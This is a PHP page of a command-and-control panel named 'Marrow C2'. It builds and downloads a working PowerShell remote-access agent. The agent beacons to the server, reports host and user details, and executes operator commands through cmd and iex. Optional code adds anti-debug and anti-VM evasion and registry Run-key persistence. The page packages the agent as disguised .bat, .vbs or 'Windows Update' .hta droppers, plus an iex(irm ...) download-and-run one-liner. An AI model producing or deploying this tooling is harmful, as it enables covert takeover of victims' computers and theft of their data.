<?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth();
// Marrow C2 - Payload Builder
require_once __DIR__ . '/../includes/Layout.php';

Layout::header('Builder');
?>

<div class="max-w-4xl mx-auto space-y-8">

    <div class="text-center mb-8">
        <h1 class="text-3xl font-bold text-white mb-2">🔧 Payload Builder</h1>
        <p class="text-gray-500">Configure and generate your agent payload</p>
    </div>

    <div class="grid grid-cols-2 gap-8">

        <!-- Configuration -->
        <div class="space-y-6">
            <div class="panel p-6">
                <h3 class="text-lg font-semibold text-white mb-4">🌐 Connection Settings</h3>
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm text-gray-400 mb-2">C2 Server URL</label>
                        <input type="text" id="c2-url" value="http://<?= $_SERVER['HTTP_HOST'] ?>/api/gate.php"
                            class="w-full input">
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm text-gray-400 mb-2">Beacon Interval (sec)</label>
                            <input type="number" id="beacon-interval" value="2" min="1" max="3600" class="w-full input">
                        </div>
                        <div>
                            <label class="block text-sm text-gray-400 mb-2">Jitter (%)</label>
                            <input type="number" id="jitter" value="20" min="0" max="100" class="w-full input">
                        </div>
                    </div>
                </div>
            </div>

            <div class="panel p-6">
                <h3 class="text-lg font-semibold text-white mb-4">⚙️ Execution Options</h3>
                <div class="space-y-3">
                    <label
                        class="flex items-center gap-3 p-3 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors">
                        <input type="checkbox" id="opt-hidden" checked class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">Hidden Window</div>
                            <div class="text-xs text-gray-500">Run without visible console</div>
                        </div>
                    </label>
                    <label
                        class="flex items-center gap-3 p-3 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors">
                        <input type="checkbox" id="opt-persist" class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">Auto-Persistence</div>
                            <div class="text-xs text-gray-500">Install persistence on first run</div>
                        </div>
                    </label>
                    <label
                        class="flex items-center gap-3 p-3 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors">
                        <input type="checkbox" id="opt-antidebug" class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">Anti-Debug</div>
                            <div class="text-xs text-gray-500">Exit if debugger detected</div>
                        </div>
                    </label>
                    <label
                        class="flex items-center gap-3 p-3 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors">
                        <input type="checkbox" id="opt-antivm" class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">Anti-VM</div>
                            <div class="text-xs text-gray-500">Exit if virtual machine detected</div>
                        </div>
                    </label>
                </div>
            </div>

            <div class="panel p-6">
                <h3 class="text-lg font-semibold text-white mb-4">📦 Output Format</h3>
                <div class="grid grid-cols-2 gap-3">
                    <label
                        class="flex items-center gap-3 p-4 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors border-2 border-transparent has-[:checked]:border-primary">
                        <input type="radio" name="format" value="ps1" checked class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">📜 PowerShell</div>
                            <div class="text-xs text-gray-500">.ps1 script</div>
                        </div>
                    </label>
                    <label
                        class="flex items-center gap-3 p-4 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors border-2 border-transparent has-[:checked]:border-primary">
                        <input type="radio" name="format" value="bat" class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">📄 Batch</div>
                            <div class="text-xs text-gray-500">.bat wrapper</div>
                        </div>
                    </label>
                    <label
                        class="flex items-center gap-3 p-4 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors border-2 border-transparent has-[:checked]:border-primary">
                        <input type="radio" name="format" value="hta" class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">🌐 HTA</div>
                            <div class="text-xs text-gray-500">.hta application</div>
                        </div>
                    </label>
                    <label
                        class="flex items-center gap-3 p-4 bg-dark-600 rounded-xl cursor-pointer hover:bg-dark-500 transition-colors border-2 border-transparent has-[:checked]:border-primary">
                        <input type="radio" name="format" value="vbs" class="w-4 h-4 accent-primary">
                        <div>
                            <div class="text-white">📝 VBScript</div>
                            <div class="text-xs text-gray-500">.vbs dropper</div>
                        </div>
                    </label>
                </div>
            </div>
        </div>

        <!-- Preview & Download -->
        <div class="space-y-6">
            <div class="panel p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-semibold text-white">📋 Preview</h3>
                    <button onclick="copyPayload()" class="btn btn-ghost text-xs">📋 Copy</button>
                </div>
                <pre id="payload-preview"
                    class="bg-dark-900 rounded-xl p-4 text-xs font-mono text-gray-300 h-80 overflow-auto"></pre>
            </div>

            <button onclick="downloadPayload()"
                class="w-full btn btn-primary text-lg py-4 flex items-center justify-center gap-3">
                <span>⬇️</span>
                <span>Generate & Download</span>
            </button>

            <div class="panel p-6">
                <h3 class="text-lg font-semibold text-white mb-4">💡 Quick Deploy</h3>
                <div class="space-y-3">
                    <div class="p-3 bg-dark-600 rounded-xl">
                        <div class="text-xs text-gray-400 mb-1">PowerShell One-Liner:</div>
                        <code id="oneliner" class="text-xs text-accent font-mono break-all"></code>
                    </div>
                    <button onclick="copyOneliner()" class="btn btn-ghost w-full text-sm">📋 Copy One-Liner</button>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    const baseAgent = `# Marrow Agent - Generated ${new Date().toISOString()}
param([string]$E = "{{URL}}")

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

{{ANTIDEBUG}}
{{ANTIVM}}

$sf = "$env:LOCALAPPDATA\\Microsoft\\Windows\\.sid"
$sd = Split-Path $sf; if (!(Test-Path $sd)) { md $sd -Force | Out-Null }
$sid = if (Test-Path $sf) { gc $sf } else { $x = -join((65..90)+(97..122)|Get-Random -C 8|%{[char]$_}); sc $sf $x; $x }

$hn = $env:COMPUTERNAME
$un = "$env:USERDOMAIN\\$env:USERNAME"
$os = (gcim Win32_OperatingSystem).Caption
$ip = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*" } | select -F 1).IPAddress
$al = "Standard"
try { if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) { $al = "Elevated" } } catch {}

{{PERSIST}}

function tx($d) { try { irm -Uri $E -Method Post -Body $d -TimeoutSec 10 } catch { $null } }
function rx($t,$r) { try { irm -Uri $E -Method Post -Body @{action='report';hwid=$sid;task_id=$t;result=$r} -TimeoutSec 10 } catch {} }

$run = $true
while ($run) {
    $res = tx @{action='checkin';hwid=$sid;hostname=$hn;ip=$ip;user=$un;integrity=$al;os=$os}
    if ($res -and $res.status -eq 'task') {
        $m = $res.module; $a = $res.args; $t = $res.id; $out = ""
        switch ($m) {
            'kill' { $out = "Terminated"; $run = $false }
            'shell' { $out = cmd /c $a 2>&1 | Out-String }
            'powershell' { $out = try { iex $a 2>&1 | Out-String } catch { $_.Exception.Message } }
            default { $out = "Module: $m" }
        }
        rx $t $out
    }
    if ($run) { Start-Sleep -Seconds {{INTERVAL}} }
}
Remove-Item $sf -Force -EA SilentlyContinue
`;

    const antidebug = `# Anti-Debug
if ([System.Diagnostics.Debugger]::IsAttached) { exit }
try { $p = Get-Process -Name "dnspy","x64dbg","x32dbg","ida*","ollydbg" -EA SilentlyContinue; if ($p) { exit } } catch {}`;

    const antivm = `# Anti-VM
$vm = (gcim Win32_ComputerSystem).Model
if ($vm -match "Virtual|VMware|VirtualBox|Hyper-V") { exit }
if ((gcim Win32_BIOS).SerialNumber -match "VMware|Virtual") { exit }`;

    const persist = `# Auto-Persistence
$sp = $PSCommandPath; if ($sp) { Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WinSvc" -Value "powershell -W Hidden -EP Bypass -F \`"$sp\`"" -EA SilentlyContinue }`;

    function updatePreview() {
        const url = document.getElementById('c2-url').value;
        const interval = document.getElementById('beacon-interval').value;
        const format = document.querySelector('input[name="format"]:checked').value;

        let payload = baseAgent
            .replace('{{URL}}', url)
            .replace('{{INTERVAL}}', interval)
            .replace('{{ANTIDEBUG}}', document.getElementById('opt-antidebug').checked ? antidebug : '')
            .replace('{{ANTIVM}}', document.getElementById('opt-antivm').checked ? antivm : '')
            .replace('{{PERSIST}}', document.getElementById('opt-persist').checked ? persist : '');

        // Format wrappers
        if (format === 'bat') {
            const hidden = document.getElementById('opt-hidden').checked ? '-WindowStyle Hidden' : '';
            payload = `@echo off
powershell ${hidden} -ExecutionPolicy Bypass -Command "${payload.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
        } else if (format === 'hta') {
            payload = `<html><head><title>Windows Update</title>
<HTA:APPLICATION ID="app" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no">
<script language="VBScript">
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"${payload.replace(/"/g, '\\"').replace(/\n/g, '; ')}\\"", 0
Close
</script>
</head>

<body></body>

</html>`;
} else if (format === 'vbs') {
payload = `Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""${payload.replace(/"/g,
'""').replace(/\n/g, '; ')}""", 0`;
}

document.getElementById('payload-preview').textContent = payload;

// One-liner
const oneliner = `iex(irm '${url.replace('/api/gate.php', '/agent.ps1')}')`;
document.getElementById('oneliner').textContent = oneliner;
}

function downloadPayload() {
const format = document.querySelector('input[name="format"]:checked').value;
const content = document.getElementById('payload-preview').textContent;
const ext = { ps1: '.ps1', bat: '.bat', hta: '.hta', vbs: '.vbs' }[format];

const blob = new Blob([content], { type: 'text/plain' });
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = 'payload' + ext;
a.click();
URL.revokeObjectURL(url);
}

function copyPayload() {
navigator.clipboard.writeText(document.getElementById('payload-preview').textContent);
alert('Copied to clipboard!');
}

function copyOneliner() {
navigator.clipboard.writeText(document.getElementById('oneliner').textContent);
alert('One-liner copied!');
}

// Event listeners
document.querySelectorAll('input').forEach(i => i.addEventListener('change', updatePreview));
updatePreview();
</script>

<style>
    .panel {
        @apply bg-dark-700 border border-dark-500 rounded-2xl;
    }

    .input {
        @apply bg-dark-600 border border-dark-500 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-primary transition-colors;
    }

    .btn {
        @apply px-4 py-2 rounded-xl text-sm font-medium transition-all;
    }

    .btn-primary {
        @apply bg-primary text-white hover:bg-primary/80;
    }

    .btn-ghost {
        @apply bg-dark-600 text-gray-300 hover:bg-dark-500 border border-dark-500;
    }
</style>

<?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth(); Layout::footer(); ?>
